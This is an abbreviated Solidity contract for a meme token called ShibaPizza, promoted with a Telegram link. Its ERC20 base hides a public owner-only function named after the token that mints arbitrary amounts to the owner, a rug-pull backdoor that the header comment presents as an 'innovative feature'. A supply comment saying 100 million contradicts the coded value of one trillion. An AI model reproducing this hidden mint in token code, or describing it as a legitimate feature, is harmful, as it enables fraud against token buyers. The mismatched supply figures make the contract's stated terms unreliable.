...
//
// $ShibaPizza proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/ShibaPizza
//  📱Website ::
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ShibaPizza(uint256 amount) public onlyOwner {
 _ShibaPizza(msg.sender, amount);
    }
    ...
    function _ShibaPizza(address account, uint256 amount) internal virtual {
...
contract ShibaPizza is ERC20 {

    uint tokenTotalSupply = 1000000000000; // 100 Million Token Supply

    constructor() public ERC20("Shiba Pizza", "ShibaPizza") {
     _ShibaPizza(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}